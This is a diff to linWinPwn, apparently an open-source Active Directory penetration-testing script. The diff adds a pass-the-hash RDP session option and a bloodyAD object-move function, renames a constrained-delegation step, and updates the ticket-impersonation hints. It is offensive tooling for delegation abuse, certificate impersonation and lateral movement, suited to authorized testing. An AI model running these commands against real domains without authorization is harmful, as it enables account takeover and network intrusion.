@@ -171,6 +171,7 @@ pyadrecon_adws=$(command -v pyadrecon_adws)
 adpulse="$scripts_dir/ADPulse-main/ADPulse.py"
 powerview_py=$(command -v powerview)
 evil_winrm_py=$(command -v evil-winrm-py)
+xfreerdp=$(command -v xfreerdp3 || command -v xfreerdp)
 krbrelayx_addspn="$scripts_dir/krbrelayx-master/addspn.py"
 rbcdbrute="$scripts_dir/rbcdbrute.py"
 ghostspn="$scripts_dir/GhostSPN.py"
@@ -183,7 +184,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.15 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.16 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -860,6 +861,7 @@ authenticate() {
         argument_privexchange="-d ${domain} -u '${user}' -p '${password}'"
         argument_adcheck="-d ${domain} -u '${user}' -p '${password}'"
         argument_evilwinrm="-u '${user}' -p '${password}'"
+        argument_xfreerdp="/u:'${user}' /p:'${password}' /d:${domain}"
         argument_godap="-u '${user}'@${domain} -p '${password}'"
         argument_mssqlpwner="${domain}/'${user}':'${password}'"
         argument_soapy="${domain}/'${user}':'${password}'"
@@ -943,6 +945,7 @@ authenticate() {
             argument_privexchange="-d ${domain} -u '${user}' --hashes ${hash}"
             argument_adcheck="-d ${domain} -u '${user}' -H ${hash}"
             argument_evilwinrm="-u '${user}' -H ${hash:33}"
+            argument_xfreerdp="/u:'${user}' /d:${domain} /pth:${hash}"
             argument_godap="-u '${user}' -d ${domain} -H ${hash}"
             argument_mssqlpwner="-hashes ${hash} ${domain}/'${user}'"
             argument_soapy="--hash ${hash:33} ${domain}/'${user}'"
@@ -1011,13 +1014,14 @@ authenticate() {
             argument_pygpoabuse="${domain}/'${user}' -k -ccache $(realpath "$krb5cc")"
             argument_GPOwned="-d ${domain} -u '${user}' -k -no-pass"
             argument_evilwinrm="-r ${domain} -u '${user}'"
+            argument_xfreerdp="/u:'${user}' /p:'${password}' /d:${domain}"
             argument_godap="-d ${domain} -k -t ldap/${target}"
             argument_mssqlpwner=" -k -no-pass ${domain}/'${user}'"
             argument_gpopars="-d ${domain} -u '${user}' -k"
             argument_gpb="-d ${dc_domain} -u '${user}' -k"
             argument_nhd="-d ${dc_domain} -u '${user}' -k"
             argument_daclsearch="-l ${domain} -u '${user}' -k"
-            argument_rking="-d ${domain} -u '${user}' -k -no-pass"
+            argument_rking="-d ${domain} -u '${user}' -k --no-pass"
             argument_pyadrecon="-d ${domain} -u '${user}' --auth kerberos --tgt-file '${krb5cc}'"
             argument_pyadrecon_adws="-d ${domain} -u '${user}' --auth kerberos"
             argument_powerview_py="-k --no-pass '${domain}/${user}'"
@@ -1062,6 +1066,7 @@ authenticate() {
 
     if [ "${forcekerb_bool}" == true ]; then
         argument_ne="${argument_ne} -k"
+        argument_bloodyad="${argument_bloodyad} -k"
     fi
 
     #Perform authentication using provided credentials
@@ -1079,6 +1084,7 @@ authenticate() {
                     if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
                         echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
                         echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
+                        echo -e "${GREEN}[+] Alternatively, re-run linWinPwn with --force-kerb to use Kerberos auth:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -p '${password}' --force-kerb"
                         exit 1
                     else
                         echo -e "${RED}[-] Failed to generate TGT${NC}"
@@ -4984,7 +4990,7 @@ add_upn_esc10() {
     echo -e ""
 }
 
-add_constrained() {
+enable_protocoltransition_constrained() {
     if ! stat "${bloodyad}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
     else
@@ -4993,7 +4999,7 @@ add_constrained() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            echo -e "${BLUE}[*] Adding Constrained Delegation rights on owned account. Please specify target:${NC}"
+            echo -e "${BLUE}[*] Enabling protocol transition (for Constrained Delegation) on owned account. Please specify target:${NC}"
             echo -e "${CYAN}[*] Example: DC01 or FILE01 ${NC}"
             target_consdeleg=""
             read -rp ">> " target_consdeleg </dev/tty
@@ -5001,7 +5007,7 @@ add_constrained() {
                 echo -e "${RED}Invalid name.${NC} Please specify target:"
                 read -rp ">> " target_consdeleg </dev/tty
             done
-            echo -e "${CYAN}[*] Adding Constrained Delegation rights to ${target_consdeleg}${NC}"
+            echo -e "${CYAN}[*] Enabling protocol transition (for Constrained Delegation) on ${target_consdeleg}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} add uac '${target_consdeleg}$' -f TRUSTED_TO_AUTH_FOR_DELEGATION" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_consdeleg_${dc_domain}.txt"
         fi
     fi
@@ -5029,7 +5035,7 @@ add_spn_constrained() {
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_spn}$' msDS-AllowedToDelegateTo -v 'HOST/${dc_NETBIOS}' -v 'HOST/${dc_FQDN}' -v 'LDAP/${dc_NETBIOS}' -v 'LDAP/${dc_FQDN}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_const_${dc_domain}.txt"
             if grep -q -a "has been updated" "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_spn_const_${dc_domain}.txt"; then
                 echo -e "${GREEN}[+] Adding DC SPNs successful! Run command below to generate impersonated ticket ${NC}"
-                echo -e "${impacket_getST} -spn '< HOST/${dc_FQDN} OR LDAP/${dc_FQDN} >' -impersonate ${dc_NETBIOS} ${domain}/'${target_spn}$':'< password of ${target_spn} >'"
+                echo -e "${impacket_getST} -spn '< HOST/${dc_FQDN} OR LDAP/${dc_FQDN} >' -impersonate < Administrator / ${dc_NETBIOS} > ${domain}/'${target_spn}$':'< password of ${target_spn} >'"
             fi
         fi
     fi
@@ -5132,6 +5138,38 @@ modify_custom_attribute() {
             fi
             echo -e "${CYAN}[*] Modifying custom attribute of ${target_custommodif}${NC}"
             run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_custommodif}' '${attr_custommodif}' ${value_custommodif} " 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_consdeleg_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+move_ou() {
+    if ! stat "${bloodyad}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
+    else
+        mkdir -p "${Modification_dir}/bloodyAD_${user_var}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            echo -e "${BLUE}[*] Moving object to a different OU. Please specify current distinguishedName of target:${NC}"
+            echo -e "${CYAN}[*] Example: CN=user,OU=Tier1,DC=domain,DC=local ${NC}"
+            target_moveou=""
+            read -rp ">> " target_moveou </dev/tty
+            while [ "${target_moveou}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify current distinguishedName of target:"
+                read -rp ">> " target_moveou </dev/tty
+            done
+            echo -e "${BLUE}[*] Please specify new distinguishedName of target (new OU location):${NC}"
+            echo -e "${CYAN}[*] Example: CN=user,OU=Tier3,DC=domain,DC=local ${NC}"
+            newdn_moveou=""
+            read -rp ">> " newdn_moveou </dev/tty
+            while [ "${newdn_moveou}" == "" ]; do
+                echo -e "${RED}Invalid name.${NC} Please specify new distinguishedName of target:"
+                read -rp ">> " newdn_moveou </dev/tty
+            done
+            echo -e "${CYAN}[*] Moving ${target_moveou} to ${newdn_moveou}${NC}"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} set object '${target_moveou}' distinguishedName -v '${newdn_moveou}'" 2>&1 | tee -a "${Modification_dir}/bloodyAD_${user_var}/bloodyad_out_moveou_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -5688,7 +5726,26 @@ evilwinrmpy_console() {
         echo -e "${BLUE}[*] Opening evilwinrm console on target: $evilwinrm_target ${NC}"
         run_command "${evil_winrm_py} ${argument_evil_winrm_py} -i ${evilwinrm_target}" 2>&1 | tee -a "${CommandExec_dir}/impacket_evilwinrmpy_output_${user_var}.txt"
     fi
-    
+
+    echo -e ""
+}
+
+rdp_console() {
+    if ! stat "${xfreerdp}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] xfreerdp not found! Please verify the installation of freerdp${NC}"
+    elif [ "${nullsess_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
+        echo -e "${PURPLE}[-] xfreerdp requires a password or NTLM hash, and does not support Null Session, or AES Key authentication${NC}"
+    else
+        echo -e "${BLUE}[*] Please specify target IP or hostname:${NC}"
+        echo -e "${CYAN}[*] Example: 10.1.0.5 or SERVER01 or SERVER01.domain.com ${NC}"
+        read -rp ">> " rdp_target </dev/tty
+        while [ "${rdp_target}" == "" ]; do
+            echo -e "${RED}Invalid IP or hostname.${NC} Please specify IP or hostname:"
+            read -rp ">> " rdp_target </dev/tty
+        done
+        echo -e "${BLUE}[*] Opening RDP session using xfreerdp on target: $rdp_target ${NC}"
+        run_command "${xfreerdp} /v:${rdp_target} ${argument_xfreerdp} /dynamic-resolution +clipboard /cert:ignore" 2>&1 | tee -a "${CommandExec_dir}/xfreerdp_output_${user_var}.txt"
+    fi
     echo -e ""
 }
 
@@ -7685,13 +7742,14 @@ modif_menu() {
         check_tool_status "${bloodyad}" "Add CIFS and HTTP SPNs entries to computer with Unconstrained Deleg rights - ServicePrincipalName & msDS-AdditionalDnsHostName (Requires: Owner of computer)" "26"
         check_tool_status "${bloodyad}" "Add userPrincipalName to perform Kerberos impersonation of another user (Targeting Linux machines) (Requires: GenericWrite on user)" "27"
         check_tool_status "${bloodyad}" "Modify userPrincipalName to perform Certificate impersonation (ESC10) (Requires: GenericWrite on user)" "28"
-        check_tool_status "${bloodyad}" "Add Constrained Delegation rights - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "29"
-        check_tool_status "${bloodyad}" "Add HOST and LDAP SPN entries of DC to computer with Constrained Deleg rights - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "30"
+        check_tool_status "${bloodyad}" "Enable protocol transition (required for Constrained Delegation) - uac: TRUSTED_TO_AUTH_FOR_DELEGATION (Requires: SeEnableDelegationPrivilege)" "29"
+        check_tool_status "${bloodyad}" "Add Constrained Deleg rights to Computer (Add HOST and LDAP SPN entries of DC) - msDS-AllowedToDelegateTo (Requires: Owner of computer)" "30"
         check_tool_status "${bloodyad}" "Add dMSA to exploit BadSuccessor on Windows Server 2025 (Requires: GenericWrite on OU)" "31"
         check_tool_status "${bloodyad}" "Remove dMSA to clean after exploiting BadSuccessor (Requires: GenericWrite on OU)" "32"
         check_tool_status "${bloodyad}" "Modify custom attribute using bloodyad (Requires: GenericWrite)" "33"
         check_tool_status "${bloodyad}" "ESC4: Set altSecurityIdentities on target (Requires: Write on altSecurityIdentities)" "34"
         check_tool_status "${bloodyad}" "Modify msDS-GroupMSAMembership to allow GMSA password read (Requires: Write on msDS-GroupMSAMembership)" "35"
+        check_tool_status "${bloodyad}" "Move object to a different OU (Requires: DELETE_CHILD on the source OU and CREATE_CHILD on the destination OU)" "36"
 
         echo -e "back) Go back"
         echo -e "exit) Exit"
@@ -7816,7 +7874,7 @@ modif_menu() {
             ;;
 
         29)
-            add_constrained
+            enable_protocoltransition_constrained
             ;;
 
         30)
@@ -7841,6 +7899,10 @@ modif_menu() {
 
         35)
             set_gmsa_membership
+            ;;
+
+        36)
+            move_ou
             ;;
 
         back)
@@ -7870,6 +7932,7 @@ cmdexec_menu() {
         check_tool_status "${impacket_psexec}" "Open CMD console using psexec on target" "3"
         check_tool_status "${evilwinrm}" "Open PowerShell console using evil-winrm on target" "4"
         check_tool_status "${evil_winrm_py}" "Open PowerShell console using evil-winrm-py on target" "5"
+        check_tool_status "${xfreerdp}" "Open RDP session using xfreerdp on target" "6"
         echo -e "back) Go back"
         echo -e "exit) Exit"
 
@@ -7894,6 +7957,10 @@ cmdexec_menu() {
 
         5)
             evilwinrmpy_console
+            ;;
+
+        6)
+            rdp_console
             ;;
 
         back)
